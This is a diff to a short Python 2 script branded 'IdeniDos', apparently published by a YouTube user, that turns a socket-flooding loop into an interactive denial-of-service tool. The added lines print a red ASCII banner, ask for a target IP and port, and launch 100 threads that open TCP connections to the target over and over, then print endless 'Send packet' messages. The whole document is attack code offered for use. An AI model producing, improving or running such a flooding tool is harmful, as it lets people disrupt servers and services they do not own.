@@ -1,10 +1,22 @@
 import socket
 from threading import Thread
+from colorama import init, Fore, Style
+init()
 
-host = "/"
+print(Fore.RED + ".___    .___            .__  _____       ") 	
+print(Fore.RED + "|   | __| _/____   ____ |__|/ ____\__.__. ")	
+print(Fore.RED + "|   |/ __ |/ __ \ /    \|  \   __<   |  | ")	
+print(Fore.RED + "|   / /_/ \  ___/|   |  \  ||  |  \___  | ")	
+print(Fore.RED + "|___\____ |\___  >___|  /__||__|  / ____| ")	
+print(Fore.RED + "               \/    \/     \/    \/      ")     
+print(Fore.GREEN + "IdeniDos")
+print(Fore.GREEN + "YouTube: Idenify")
+print 
+print 
+host = raw_input("IP Target : ")
 ip = host
-port = 80
-
+port = input("Port      : ")
+port = port
 def dos():
     while True:
         mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
@@ -18,7 +30,9 @@ def dos():
 
 for i in range(100):
     t = Thread(target=dos)
-    t.start() 
+    t.start()
 
+while True:
+     print "Send packet to %s throught port:%s"%(ip,port)
 
 
